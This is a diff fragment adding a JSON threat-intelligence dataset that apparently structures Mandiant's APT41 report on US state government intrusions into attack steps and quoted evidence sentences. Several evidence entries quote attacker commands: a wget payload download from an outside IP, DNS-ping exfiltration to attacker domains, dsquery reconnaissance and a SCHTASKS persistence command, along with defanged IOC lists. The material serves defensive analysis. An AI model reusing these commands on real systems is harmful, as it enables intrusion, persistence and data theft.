+        "ev_58",
+        "ev_59"
+      ]
+    },
+    {
+      "step_id": "step_006",
+      "stage": "execution",
+      "relation_id": "rel_0010",
+      "type": "uses_malware",
+      "summary": "APT41 uses_malware DUSTPAN",
+      "evidence_ids": [
+        "ev_56",
+        "ev_55",
+        "ev_57"
+      ]
+    },
+    {
+      "step_id": "step_007",
+      "stage": "execution",
+      "relation_id": "rel_0011",
+      "type": "uses_tool",
+      "summary": "APT41 uses_tool Dsquery",
+      "evidence_ids": [
+        "ev_121"
+      ]
+    }
+  ],
+  "evidences": [
+    {
+      "id": "ev_2",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s2"
+      },
+      "text": "state government networks by exploiting vulnerable Internet facing web applications, including using a zero-day vulnerability in the USAHerds application (CVE-2021- 44207) as well as the now infamous zero-day in Log4j (CVE-2021-44228).",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_3",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s3"
+      },
+      "text": "While the overall goals of APT41's campaign remain unknown, our investigations into each of these intrusions has revealed a variety of new techniques, malware variants, evasion methods, and capabilities.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_4",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s4"
+      },
+      "text": "Campaign Overview Although APT41 has historically performed mass scanning and exploitation of vulnerabilities, our investigations into APT41 activity between May 2021 and February 2022 uncovered evidence of a deliberate campaign targeting U.S.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_6",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s6"
+      },
+      "text": "state government networks through the exploitation of vulnerable Internet facing web applications, often written in ASP.NET.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_8",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s8"
+      },
+      "text": "APT41 was also quick to adapt and use publicly disclosed vulnerabilities to gain initial access into target networks, while also maintaining existing operations.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_12",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s12"
+      },
+      "text": "Our ongoing investigations show the activity closely aligns with APT41's May-December 2021 activity, representing a continuation of their campaign into 2022 and demonstrating their unceasing desire to access state government networks.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_15",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s15"
+      },
+      "text": "Although the victimology and targeting of PII data is consistent with an espionage operation, Mandiant cannot make a definitive assessment at this time given APT41’s history of moonlighting for personal financial gain.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_16",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s16"
+      },
+      "text": "Exploitation of Deserialization Vulnerabilities APT41 has primarily used malicious ViewStates to trigger code execution against targeted web applications.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_17",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s17"
+      },
+      "text": "Within the ASP.NET framework, ViewState is a method for storing the application’s page and control values in HTTP requests to and from the server.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_20",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 1,
+        "section": "body",
+        "sentence_id": "p1_s20"
+      },
+      "text": "To prevent a threat actor from manipulating the ViewState and taking advantage of the insecure deserialization provider, the ViewState is protected by a Message Authentication Code (MAC).",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_23",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 2,
+        "section": "body",
+        "sentence_id": "p2_s3"
+      },
+      "text": "A threat actor with knowledge of the machineKey can construct a malicious ViewState and then generate a new and valid MAC that the server accepts.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_24",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 2,
+        "section": "body",
+        "sentence_id": "p2_s4"
+      },
+      "text": "Publicly available tools such as YSoSerial.NET exist to construct these malicious ViewStates.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_26",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 2,
+        "section": "body",
+        "sentence_id": "p2_s6"
+      },
+      "text": "Proprietary Web Application Targeting In June 2020, one year before APT41 began this campaign, Mandiant investigated an incident where APT41 exploited a directory traversal vulnerability specifically to read the web.config file for a vulnerable web application on a victim web server.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_30",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 2,
+        "section": "body",
+        "sentence_id": "p2_s10"
+      },
+      "text": "To craft malicious ViewStates, APT41 relied on the publicly available Github project YSoSerial.NET.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_34",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 2,
+        "section": "body",
+        "sentence_id": "p2_s14"
+      },
+      "text": "USAHerds (CVE-2021-44207) Zero-Day In three investigations from 2021, APT41 exploited a zero-day vulnerability in the USAHerds web application.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_35",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 2,
+        "section": "body",
+        "sentence_id": "p2_s15"
+      },
+      "text": "USAHerds is a CoTS application written in ASP.NET and used by 18 states for animal health management.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_36",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 2,
+        "section": "body",
+        "sentence_id": "p2_s16"
+      },
+      "text": "The vulnerability in USAHerds (CVE-2021-44207) is similar to a previously reported vulnerability in Microsoft Exchange Server (CVE-2020-0688), where the applications used a static validationKey and decryptionKey (collectively known as the machineKey) by default.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_37",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 2,
+        "section": "body",
+        "sentence_id": "p2_s17"
+      },
+      "text": "Generating unique machineKey values is critical to the security of an ASP.NET web application because the values are used to secure the integrity of the ViewState.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_39",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s2"
+      },
+      "text": "Log4j (CVE-2021-44228) The most recent APT41 campaign began shortly after the release of CVE-2021-44228 and its related proof-of-concept exploits in December 2021.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_41",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s4"
+      },
+      "text": "Similar to their previous web application targeting, APT41 continued to use YSoSerial generated deserialization payloads to perform reconnaissance and deploy backdoors.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_42",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s5"
+      },
+      "text": "Notably, APT41 deployed a new variant of the KEYPLUG backdoor on Linux servers at multiple victims, a malware sub-family we now track as KEYPLUG.LINUX.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_43",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s6"
+      },
+      "text": "KEYPLUG is a modular backdoor written in C++ that supports multiple network protocols for command and control (C2) traffic including HTTP, TCP, KCP over UDP, and WSS.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_44",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s7"
+      },
+      "text": "APT41 heavily used the Windows version of the KEYPLUG backdoor at state government victims between June 2021 and December 2021, thus the deployment of a ported version of the backdoor closely following the state government campaign was significant.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_45",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s8"
+      },
+      "text": "After exploiting Log4Shell, APT41 continued to use deserialization payloads to issue ping commands to domains, a technique APT41 frequently used at government victims months prior.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_46",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s9"
+      },
+      "text": "Upon gaining access to a target environment, APT41 performed host and network reconnaissance before deploying KEYPLUG.LINUX to establish a foothold in the environment.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_54",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s17"
+      },
+      "text": "APT41 also conducted Active Directory reconnaissance by uploading the Windows command-line tool dsquery.exe (MD5: 49f1daea8a115dd6fce51a1328d863cf) and its associated module dsquery.dll (MD5: b108b28138b93ec4822e165b82e41c7a) to a staging directory on the compromised server.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_55",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 3,
+        "section": "body",
+        "sentence_id": "p3_s18"
+      },
+      "text": "Figure 7 shows multiple dsquery commands used to enumerate various Active Directory objects within the environment.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_56",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 4,
+        "section": "body",
+        "sentence_id": "p4_s1"
+      },
+      "text": "state government intrusion, Mandiant identified a new malware family used by APT41 we track as DUSTPAN.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_57",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 4,
+        "section": "body",
+        "sentence_id": "p4_s2"
+      },
+      "text": "Different variations of DUSTPAN may also load and execute a payload from a hard-coded filepath encrypted in the binary.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_58",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 4,
+        "section": "body",
+        "sentence_id": "p4_s3"
+      },
+      "text": "During the intrusion, DUSTPAN was used to drop a Cobalt Strike BEACON backdoor.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_59",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 4,
+        "section": "body",
+        "sentence_id": "p4_s4"
+      },
+      "text": "Anti-Analysis APT41 continues to leverage advanced malware in their existing toolkit, such as the DEADEYE launcher and LOWKEY backdoor, with added capabilities and anti-analysis techniques to hinder investigations.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_66",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 4,
+        "section": "body",
+        "sentence_id": "p4_s11"
+      },
+      "text": "Common file naming conventions used by APT41 when deploying DEADEYE on victim hosts can be seen in Figure 8.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_73",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 4,
+        "section": "body",
+        "sentence_id": "p4_s18"
+      },
+      "text": "APT41 also updated the DEADEYE execution guardrail capabilities used during the campaign.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_76",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 4,
+        "section": "body",
+        "sentence_id": "p4_s21"
+      },
+      "text": "state government campaign.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_84",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 4,
+        "section": "body",
+        "sentence_id": "p4_s29"
+      },
+      "text": "APT41 commonly uses the living off the land binary (lolbin) shell32.dll!ShellExec_RunDLLA in scheduled tasks for binary execution, such as the example shown in Figure 10.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_87",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 5,
+        "section": "body",
+        "sentence_id": "p5_s2"
+      },
+      "text": "A modified IAT of a legitimate Microsoft HealthService.exe binary can be seen in Figure 11.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_88",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 5,
+        "section": "body",
+        "sentence_id": "p5_s3"
+      },
+      "text": "APT41 continues to tailor their malware to victim environments through their stealthy passive backdoor LOWKEY.PASSIVE.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_89",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 5,
+        "section": "body",
+        "sentence_id": "p5_s4"
+      },
+      "text": "During one intrusion, APT41 exploited a USAHerds server and subsequently executed DEADEYE.APPEND which dropped LOWKEY.PASSIVE in-memory.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_94",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 5,
+        "section": "body",
+        "sentence_id": "p5_s9"
+      },
+      "text": "At multiple victims, APT41 issued ping commands where the output of a reconnaissance command was prepended to subdomains of Cloudflare proxied infrastructure.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_99",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 5,
+        "section": "body",
+        "sentence_id": "p5_s14"
+      },
+      "text": "cmd.exe /c ping %userdomain%[.]ns[.]time12[.]cf In Figure 14, APT41 issued a command to find the volume serial number of the system, which has historically been used as the decryption key for DEADEYE payloads.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_101",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 6,
+        "section": "body",
+        "sentence_id": "p6_s1"
+      },
+      "text": "In this last example, the command prints the length of the file syslog_6-1.dat, likely to ensure it has been fully written to disk prior to combining the multiple files into the full malicious executable.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_102",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 6,
+        "section": "body",
+        "sentence_id": "p6_s2"
+      },
+      "text": "ping -n 1 ((ls C:\\Users\\public\\syslog_6-1.dat).Length.ToString()+\"\".ns[.]time12[.]cf\"\")",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_106",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 6,
+        "section": "body",
+        "sentence_id": "p6_s6"
+      },
+      "text": "Mandiant identified a unique capability added to KEYPLUG that leverages the WebSocket over TLS (WSS) protocol for C2 communication.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_110",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 6,
+        "section": "body",
+        "sentence_id": "p6_s10"
+      },
+      "text": "The CIDR blocks listed in Figure 16 are Cloudflare CDN associated infrastructure that will redirect the WSS connection to the malicious domain afdentry[.]workstation[.]eu[.]org.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_111",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 6,
+        "section": "body",
+        "sentence_id": "p6_s11"
+      },
+      "text": "APT41’s increased usage of Cloudflare services indicates a desire to leverage Cloudflare’s flexibility and deter identification and blocking of their true C2 servers.",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_112",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 7,
+        "section": "body",
+        "sentence_id": "p7_s1"
+      },
+      "text": "State Government Campaign – USAHerds (CVE-2021-44207) Exploitation 194[.]195[.]125[.]121 194[.]156[.]98[.]12 54[.]248[.]110[.]45 45[.]153[.]231[.]31 185[.]118[.]167[.]40 104[.]18[.]6[.]251 104[.]18[.]7[.]251 20[.]121[.]42[.]11 34[.]139[.]13[.]46 54[.]80[.]67[.]241 149[.]28[.]15[.]152 18[.]118[.]56[.]237 107[.]172[.]210[.]69 172[.]104[.]206[.]48 67[.]205[.]132[.]162 45[.]84[.]1[.]181 cdn[.]ns[.]time12[.]cf east[.]winsproxy[.]com afdentry[.]workstation[.]eu[.]org ns1[.]entrydns[.]eu[.]org subnet[.]milli-seconds[.]com work[.]viewdns[.]ml work[.]queryip[.]cf",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_113",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 7,
+        "section": "body",
+        "sentence_id": "p7_s2"
+      },
+      "text": "Log4j (CVE-2021-44228) Exploitation 103[.]238[.]225[.]37 182[.]239[.]92[.]31 microsoftfile[.]com down-flash[.]com libxqagv[.]ns[.]dns3[.]cf",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_114",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 9,
+        "section": "body",
+        "sentence_id": "p9_s1"
+      },
+      "text": "description = \"Hunting for BADPOTATO samples based on default strings found on the PE VERSIONINFO resource.\"",
+      "language": "en",
+      "confidence": 0.95,
+      "note": "narrative sentence evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_116",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 2,
+        "section": "rule",
+        "sentence_id": "p2_r2"
+      },
+      "text": "USAHerds (CVE-2021-44207) Zero-Day",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_117",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 3,
+        "section": "rule",
+        "sentence_id": "p3_r1"
+      },
+      "text": "Log4j (CVE-2021-44228)",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_118",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 3,
+        "section": "rule",
+        "sentence_id": "p3_r2"
+      },
+      "text": "After exploiting Log4Shell, APT41 continued to use deserialization payloads to issue ping commands to domains, a technique APT41 frequently used at government victims months prior. An example ping command is shown in Figure 5.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_119",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 3,
+        "section": "rule",
+        "sentence_id": "p3_r3"
+      },
+      "text": "wget http://103.224.80[.]44:8080/kernel",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_121",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 3,
+        "section": "rule",
+        "sentence_id": "p3_r5"
+      },
+      "text": "APT41 also conducted Active Directory reconnaissance by uploading the Windows command-line tool dsquery.exe (MD5: 49f1daea8a115dd6fce51a1328d863cf) and its associated module dsquery.dll (MD5: b108b28138b93ec4822e165b82e41c7a) to a staging directory on the compromised server. Figure 7 shows multiple dsquery commands used to enumerate various Active Directory objects within the environment.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_124",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 3,
+        "section": "rule",
+        "sentence_id": "p3_r8"
+      },
+      "text": "c:\\programdata\\dsquery.exe * -filter \"(objectCategory=Computer)\" -attr cnservicePrincipalName -L -limit 0",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_126",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 3,
+        "section": "rule",
+        "sentence_id": "p3_r10"
+      },
+      "text": "c:\\programdata\\dsquery.exe * -filter \"(objectClass=organizationalUnit)\" -attr ou name whenCreated distinguishedName gPLink -limit 0",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_127",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 4,
+        "section": "rule",
+        "sentence_id": "p4_r1"
+      },
+      "text": "\"cmd\" /c copy /y /b C:\\Users\\public\\syslog_6-*.dat C:\\Users\\public\\syslog.dll",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_128",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 4,
+        "section": "rule",
+        "sentence_id": "p4_r2"
+      },
+      "text": "To persist execution of DEADEYE, APT41 has leveraged the schtasks /change command to modify existing scheduled tasks that run under the context of SYSTEM. APT41 commonly uses the living off the land binary (lolbin) shell32.dll!ShellExec_RunDLLA in scheduled tasks for binary execution, such as the example shown in Figure 10.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_129",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 4,
+        "section": "rule",
+        "sentence_id": "p4_r3"
+      },
+      "text": "SCHTASKS /Change /tn \"\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor\" /TR \"C:\\windows\\system32\\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\\windows\\system32\\msiexec.exe /Z c:\\programdata\\S-1-5-18.dat\" /RL HIGHEST /RU \"\" /ENABLE",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_130",
+      "evidence_type": "report_text",
+      "report_id": "Mandiant_Summary-APT41-Targeting-US-State-Governments(03-08-2022)",
+      "locator": {
+        "page": 5,
+        "section": "rule",
+        "sentence_id": "p5_r1"
+      },
+      "text": "Another technique APT41 used to launch malware is through the addition of a malicious import to the Import Address Table (IAT) of legitimate Windows PE binaries. As a result, once the legitimate binary is executed, it will load the malicious library and call its DllEntryPoint. A modified IAT of a legitimate Microsoft HealthService.exe binary can be seen in Figure 11.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_132",
+      "evidence_type": "report_text",
